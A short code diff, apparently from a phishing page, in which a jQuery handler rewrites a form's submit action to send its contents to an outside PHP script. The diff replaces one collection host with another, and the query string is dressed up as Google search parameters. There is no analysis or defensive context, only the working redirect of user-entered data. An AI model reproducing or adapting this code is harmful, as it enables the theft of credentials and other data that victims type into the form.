@@ -1,3 +1,3 @@
 $("form").submit(function() {
-  $(myform).attr("action", "https://sanakmemangmirippantek.000webhostapp.com/epek.php?q=fgf&rlz=1C1CHWL_enID101");
+  $(myform).attr("action", "https://www.semangat-baru.my.id/tabedo/sayua.php?q=fgf&rlz=1C1CHWL_enID101");
 });
